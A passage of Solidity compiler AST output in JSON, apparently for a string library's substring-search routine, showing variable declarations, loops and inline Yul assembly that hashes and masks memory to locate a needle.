																		"nodeType": "InlineAssembly",
																		"src": "3539:52:3"
																	},
																	{
																		"body": {
																			"id": 378,
																			"nodeType": "Block",
																			"src": "3661:242:3",
																			"statements": [
																				{
																					"assignments": [
																						365
																					],
																					"declarations": [
																						{
																							"constant": false,
																							"id": 365,
																							"mutability": "mutable",
																							"name": "testHash",
																							"nodeType": "VariableDeclaration",
																							"overrides": null,
																							"scope": 378,
																							"src": "3684:16:3",
																							"stateVariable": false,
																							"storageLocation": "default",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							},
																							"typeName": {
																								"id": 364,
																								"name": "bytes32",
																								"nodeType": "ElementaryTypeName",
																								"src": "3684:7:3",
																								"typeDescriptions": {
																									"typeIdentifier": "t_bytes32",
																									"typeString": "bytes32"
																								}
																							},
																							"value": null,
																							"visibility": "internal"
																						}
																					],
																					"id": 366,
																					"initialValue": null,
																					"nodeType": "VariableDeclarationStatement",
																					"src": "3684:16:3"
																				},
																				{
																					"AST": {
																						"nodeType": "YulBlock",
																						"src": "3732:41:3",
																						"statements": [
																							{
																								"nodeType": "YulAssignment",
																								"src": "3734:37:3",
																								"value": {
																									"arguments": [
																										{
																											"name": "ptr",
																											"nodeType": "YulIdentifier",
																											"src": "3756:3:3"
																										},
																										{
																											"name": "needlelen",
																											"nodeType": "YulIdentifier",
																											"src": "3761:9:3"
																										}
																									],
																									"functionName": {
																										"name": "keccak256",
																										"nodeType": "YulIdentifier",
																										"src": "3746:9:3"
																									},
																									"nodeType": "YulFunctionCall",
																									"src": "3746:25:3"
																								},
																								"variableNames": [
																									{
																										"name": "testHash",
																										"nodeType": "YulIdentifier",
																										"src": "3734:8:3"
																									}
																								]
																							}
																						]
																					},
																					"evmVersion": "istanbul",
																					"externalReferences": [
																						{
																							"declaration": 273,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3761:9:3",
																							"valueSize": 1
																						},
																						{
																							"declaration": 281,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3756:3:3",
																							"valueSize": 1
																						},
																						{
																							"declaration": 365,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3734:8:3",
																							"valueSize": 1
																						}
																					],
																					"id": 367,
																					"nodeType": "InlineAssembly",
																					"src": "3723:50:3"
																				},
																				{
																					"condition": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_bytes32",
																							"typeString": "bytes32"
																						},
																						"id": 370,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 368,
																							"name": "hash",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 349,
																							"src": "3799:4:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "==",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 369,
																							"name": "testHash",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 365,
																							"src": "3807:8:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							}
																						},
																						"src": "3799:16:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bool",
																							"typeString": "bool"
																						}
																					},
																					"falseBody": null,
																					"id": 373,
																					"nodeType": "IfStatement",
																					"src": "3795:57:3",
																					"trueBody": {
																						"expression": {
																							"argumentTypes": null,
																							"id": 371,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 281,
																							"src": "3849:3:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"functionReturnParameters": 279,
																						"id": 372,
																						"nodeType": "Return",
																						"src": "3842:10:3"
																					}
																				},
																				{
																					"expression": {
																						"argumentTypes": null,
																						"id": 376,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftHandSide": {
																							"argumentTypes": null,
																							"id": 374,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 281,
																							"src": "3875:3:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "Assignment",
																						"operator": "+=",
																						"rightHandSide": {
																							"argumentTypes": null,
																							"hexValue": "31",
																							"id": 375,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "3882:1:3",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_1_by_1",
																								"typeString": "int_const 1"
																							},
																							"value": "1"
																						},
																						"src": "3875:8:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 377,
																					"nodeType": "ExpressionStatement",
																					"src": "3875:8:3"
																				}
																			]
																		},
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 360,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 356,
																				"name": "idx",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 285,
																				"src": "3626:3:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 359,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 357,
																					"name": "selflen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 269,
																					"src": "3633:7:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "-",
																				"rightExpression": {
																					"argumentTypes": null,
																					"id": 358,
																					"name": "needlelen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 273,
																					"src": "3643:9:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"src": "3633:19:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "3626:26:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"id": 379,
																		"initializationExpression": {
																			"expression": {
																				"argumentTypes": null,
																				"id": 354,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"argumentTypes": null,
																					"id": 352,
																					"name": "idx",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 285,
																					"src": "3617:3:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "=",
																				"rightHandSide": {
																					"argumentTypes": null,
																					"hexValue": "30",
																					"id": 353,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "3623:1:3",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_0_by_1",
																						"typeString": "int_const 0"
																					},
																					"value": "0"
																				},
																				"src": "3617:7:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 355,
																			"nodeType": "ExpressionStatement",
																			"src": "3617:7:3"
																		},
																		"loopExpression": {
																			"expression": {
																				"argumentTypes": null,
																				"id": 362,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"nodeType": "UnaryOperation",
																				"operator": "++",
																				"prefix": false,
																				"src": "3654:5:3",
																				"subExpression": {
																					"argumentTypes": null,
																					"id": 361,
																					"name": "idx",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 285,
																					"src": "3654:3:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 363,
																			"nodeType": "ExpressionStatement",
																			"src": "3654:5:3"
																		},
																		"nodeType": "ForStatement",
																		"src": "3612:291:3"
																	}
																]
															},
															"id": 381,
															"nodeType": "IfStatement",
															"src": "2765:1153:3",
															"trueBody": {
																"id": 347,
																"nodeType": "Block",
																"src": "2786:647:3",
																"statements": [
																	{
																		"assignments": [
																			294
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 294,
																				"mutability": "mutable",
																				"name": "mask",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 347,
																				"src": "2805:12:3",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 293,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "2805:7:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 311,
																		"initialValue": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 309,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"nodeType": "UnaryOperation",
																					"operator": "~",
																					"prefix": true,
																					"src": "2828:34:3",
																					"subExpression": {
																						"argumentTypes": null,
																						"components": [
																							{
																								"argumentTypes": null,
																								"commonType": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								},
																								"id": 307,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": false,
																								"lValueRequested": false,
																								"leftExpression": {
																									"argumentTypes": null,
																									"commonType": {
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									},
																									"id": 305,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": false,
																									"lValueRequested": false,
																									"leftExpression": {
																										"argumentTypes": null,
																										"hexValue": "32",
																										"id": 297,
																										"isConstant": false,
																										"isLValue": false,
																										"isPure": true,
																										"kind": "number",
																										"lValueRequested": false,
																										"nodeType": "Literal",
																										"src": "2830:1:3",
																										"subdenomination": null,
																										"typeDescriptions": {
																											"typeIdentifier": "t_rational_2_by_1",
																											"typeString": "int_const 2"
																										},
																										"value": "2"
																									},
																									"nodeType": "BinaryOperation",
																									"operator": "**",
																									"rightExpression": {
																										"argumentTypes": null,
																										"components": [
																											{
																												"argumentTypes": null,
																												"commonType": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												},
																												"id": 303,
																												"isConstant": false,
																												"isLValue": false,
																												"isPure": false,
																												"lValueRequested": false,
																												"leftExpression": {
																													"argumentTypes": null,
																													"hexValue": "38",
																													"id": 298,
																													"isConstant": false,
																													"isLValue": false,
																													"isPure": true,
																													"kind": "number",
																													"lValueRequested": false,
																													"nodeType": "Literal",
																													"src": "2836:1:3",
																													"subdenomination": null,
																													"typeDescriptions": {
																														"typeIdentifier": "t_rational_8_by_1",
																														"typeString": "int_const 8"
																													},
																													"value": "8"
																												},
																												"nodeType": "BinaryOperation",
																												"operator": "*",
																												"rightExpression": {
																													"argumentTypes": null,
																													"components": [
																														{
																															"argumentTypes": null,
																															"commonType": {
																																"typeIdentifier": "t_uint256",
																																"typeString": "uint256"
																															},
																															"id": 301,
																															"isConstant": false,
																															"isLValue": false,
																															"isPure": false,
																															"lValueRequested": false,
																															"leftExpression": {
																																"argumentTypes": null,
																																"hexValue": "3332",
																																"id": 299,
																																"isConstant": false,
																																"isLValue": false,
																																"isPure": true,
																																"kind": "number",
																																"lValueRequested": false,
																																"nodeType": "Literal",
																																"src": "2841:2:3",
																																"subdenomination": null,
																																"typeDescriptions": {
																																	"typeIdentifier": "t_rational_32_by_1",
																																	"typeString": "int_const 32"
																																},
																																"value": "32"
																															},
																															"nodeType": "BinaryOperation",
																															"operator": "-",
																															"rightExpression": {
																																"argumentTypes": null,
																																"id": 300,
																																"name": "needlelen",
																																"nodeType": "Identifier",
																																"overloadedDeclarations": [],
																																"referencedDeclaration": 273,
																																"src": "2846:9:3",
																																"typeDescriptions": {
																																	"typeIdentifier": "t_uint256",
																																	"typeString": "uint256"
																																}
																															},
																															"src": "2841:14:3",
																															"typeDescriptions": {
																																"typeIdentifier": "t_uint256",
																																"typeString": "uint256"
																															}
																														}
																													],
																													"id": 302,
																													"isConstant": false,
																													"isInlineArray": false,
																													"isLValue": false,
																													"isPure": false,
																													"lValueRequested": false,
																													"nodeType": "TupleExpression",
																													"src": "2840:16:3",
																													"typeDescriptions": {
																														"typeIdentifier": "t_uint256",
																														"typeString": "uint256"
																													}
																												},
																												"src": "2836:20:3",
																												"typeDescriptions": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												}
																											}
																										],
																										"id": 304,
																										"isConstant": false,
																										"isInlineArray": false,
																										"isLValue": false,
																										"isPure": false,
																										"lValueRequested": false,
																										"nodeType": "TupleExpression",
																										"src": "2835:22:3",
																										"typeDescriptions": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									},
																									"src": "2830:27:3",
																									"typeDescriptions": {
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									}
																								},
																								"nodeType": "BinaryOperation",
																								"operator": "-",
																								"rightExpression": {
																									"argumentTypes": null,
																									"hexValue": "31",
																									"id": 306,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": true,
																									"kind": "number",
																									"lValueRequested": false,
																									"nodeType": "Literal",
																									"src": "2860:1:3",
																									"subdenomination": null,
																									"typeDescriptions": {
																										"typeIdentifier": "t_rational_1_by_1",
																										"typeString": "int_const 1"
																									},
																									"value": "1"
																								},
																								"src": "2830:31:3",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							}
																						],
																						"id": 308,
																						"isConstant": false,
																						"isInlineArray": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"nodeType": "TupleExpression",
																						"src": "2829:33:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"id": 296,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "2820:7:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_bytes32_$",
																					"typeString": "type(bytes32)"
																				},
																				"typeName": {
																					"id": 295,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "2820:7:3",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 310,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "2820:43:3",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_bytes32",
																				"typeString": "bytes32"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "2805:58:3"
																	},
																	{
																		"assignments": [
																			313
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 313,
																				"mutability": "mutable",
																				"name": "needledata",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 347,
																				"src": "2885:18:3",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 312,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "2885:7:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 314,
																		"initialValue": null,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "2885:18:3"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "2931:45:3",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "2933:41:3",
																					"value": {
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"name": "needleptr",
																										"nodeType": "YulIdentifier",
																										"src": "2957:9:3"
																									}
																								],
																								"functionName": {
																									"name": "mload",
																									"nodeType": "YulIdentifier",
																									"src": "2951:5:3"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "2951:16:3"
																							},
																							{
																								"name": "mask",
																								"nodeType": "YulIdentifier",
																								"src": "2969:4:3"
																							}
																						],
																						"functionName": {
																							"name": "and",
																							"nodeType": "YulIdentifier",
																							"src": "2947:3:3"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "2947:27:3"
																					},
																					"variableNames": [
																						{
																							"name": "needledata",
																							"nodeType": "YulIdentifier",
																							"src": "2933:10:3"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "istanbul",
																		"externalReferences": [
																			{
																				"declaration": 294,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "2969:4:3",
																				"valueSize": 1
																			},
																			{
																				"declaration": 313,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "2933:10:3",
																				"valueSize": 1
																			},
																			{
																				"declaration": 275,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "2957:9:3",
																				"valueSize": 1
																			}
																		],
																		"id": 315,
																		"nodeType": "InlineAssembly",
																		"src": "2922:54:3"
																	},
																	{
																		"assignments": [
																			317
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 317,
																				"mutability": "mutable",
																				"name": "end",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 347,
																				"src": "2997:8:3",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"typeName": {
																					"id": 316,
																					"name": "uint",
																					"nodeType": "ElementaryTypeName",
																					"src": "2997:4:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 323,
																		"initialValue": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 322,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 320,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 318,
																					"name": "selfptr",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 271,
																					"src": "3008:7:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "+",
																				"rightExpression": {
																					"argumentTypes": null,
																					"id": 319,
																					"name": "selflen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 269,
																					"src": "3018:7:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"src": "3008:17:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 321,
																				"name": "needlelen",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 273,
																				"src": "3028:9:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "3008:29:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "2997:40:3"
																	},
																	{
																		"assignments": [
																			325
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 325,
																				"mutability": "mutable",
																				"name": "ptrdata",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 347,
																				"src": "3056:15:3",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 324,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "3056:7:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 326,
																		"initialValue": null,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "3056:15:3"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "3099:36:3",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "3101:32:3",
																					"value": {
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"name": "ptr",
																										"nodeType": "YulIdentifier",
																										"src": "3122:3:3"
																									}
																								],
																								"functionName": {
																									"name": "mload",
																									"nodeType": "YulIdentifier",
																									"src": "3116:5:3"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "3116:10:3"
																							},
																							{
																								"name": "mask",
																								"nodeType": "YulIdentifier",
																								"src": "3128:4:3"
																							}
																						],
																						"functionName": {
																							"name": "and",
																							"nodeType": "YulIdentifier",
																							"src": "3112:3:3"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "3112:21:3"
																					},
																					"variableNames": [
																						{
																							"name": "ptrdata",
																							"nodeType": "YulIdentifier",
																							"src": "3101:7:3"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "istanbul",
																		"externalReferences": [
																			{
																				"declaration": 294,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3128:4:3",
																				"valueSize": 1
																			},
																			{
																				"declaration": 281,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3122:3:3",
																				"valueSize": 1
																			},
																			{
																				"declaration": 325,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3101:7:3",
																				"valueSize": 1
																			}
																		],
																		"id": 327,
																		"nodeType": "InlineAssembly",
																		"src": "3090:45:3"
																	},
																	{
																		"body": {
																			"id": 343,
																			"nodeType": "Block",
																			"src": "3186:203:3",
																			"statements": [
																				{
																					"condition": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 333,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 331,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 281,
																							"src": "3213:3:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": ">=",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 332,
																							"name": "end",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 317,
																							"src": "3220:3:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "3213:10:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bool",
																							"typeString": "bool"
																						}
																					},
																					"falseBody": null,
																					"id": 338,
																					"nodeType": "IfStatement",
																					"src": "3209:65:3",
																					"trueBody": {
																						"expression": {
																							"argumentTypes": null,
																							"commonType": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							},
																							"id": 336,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"leftExpression": {
																								"argumentTypes": null,
																								"id": 334,
																								"name": "selfptr",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 271,
																								"src": "3257:7:3",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"nodeType": "BinaryOperation",
																							"operator": "+",
																							"rightExpression": {
																								"argumentTypes": null,
																								"id": 335,
																								"name": "selflen",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 269,
																								"src": "3267:7:3",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"src": "3257:17:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"functionReturnParameters": 279,
																						"id": 337,
																						"nodeType": "Return",
																						"src": "3250:24:3"
																					}
																				},
																				{
																					"expression": {
																						"argumentTypes": null,
																						"id": 340,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"nodeType": "UnaryOperation",
																						"operator": "++",
																						"prefix": false,
																						"src": "3297:5:3",
																						"subExpression": {
																							"argumentTypes": null,
																							"id": 339,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 281,
																							"src": "3297:3:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 341,
																					"nodeType": "ExpressionStatement",
																					"src": "3297:5:3"
																				},
																				{
																					"AST": {
																						"nodeType": "YulBlock",
																						"src": "3334:36:3",
																						"statements": [
																							{
																								"nodeType": "YulAssignment",
																								"src": "3336:32:3",
																								"value": {
																									"arguments": [
																										{
																											"arguments": [
																												{
																													"name": "ptr",
																													"nodeType": "YulIdentifier",
																													"src": "3357:3:3"
																												}
																											],
																											"functionName": {
																												"name": "mload",
																												"nodeType": "YulIdentifier",
																												"src": "3351:5:3"
																											},
																											"nodeType": "YulFunctionCall",
																											"src": "3351:10:3"
																										},
																										{
																											"name": "mask",
																											"nodeType": "YulIdentifier",
																											"src": "3363:4:3"
																										}
																									],
																									"functionName": {
																										"name": "and",
																										"nodeType": "YulIdentifier",
																										"src": "3347:3:3"
																									},
																									"nodeType": "YulFunctionCall",
																									"src": "3347:21:3"
																								},
																								"variableNames": [
																									{
																										"name": "ptrdata",
																										"nodeType": "YulIdentifier",
																										"src": "3336:7:3"
																									}
																								]
																							}
																						]
																					},
																					"evmVersion": "istanbul",
																					"externalReferences": [
																						{
																							"declaration": 294,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3363:4:3",
																							"valueSize": 1
																						},
																						{
																							"declaration": 281,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3357:3:3",
																							"valueSize": 1
																						},
																						{
																							"declaration": 325,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3336:7:3",
																							"valueSize": 1
																						}
																					],
																					"id": 342,
																					"nodeType": "InlineAssembly",
																					"src": "3325:45:3"
																				}
																			]
																		},
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_bytes32",
																				"typeString": "bytes32"
																			},
																			"id": 330,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 328,
																				"name": "ptrdata",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 325,
																				"src": "3163:7:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "!=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 329,
																				"name": "needledata",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 313,
																				"src": "3174:10:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			},
																			"src": "3163:21:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"id": 344,
																		"nodeType": "WhileStatement",
																		"src": "3156:233:3"
																	},
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 345,
																			"name": "ptr",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 281,
																			"src": "3414:3:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"functionReturnParameters": 279,
																		"id": 346,
																		"nodeType": "Return",
																		"src": "3407:10:3"
																	}
																]
															}
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
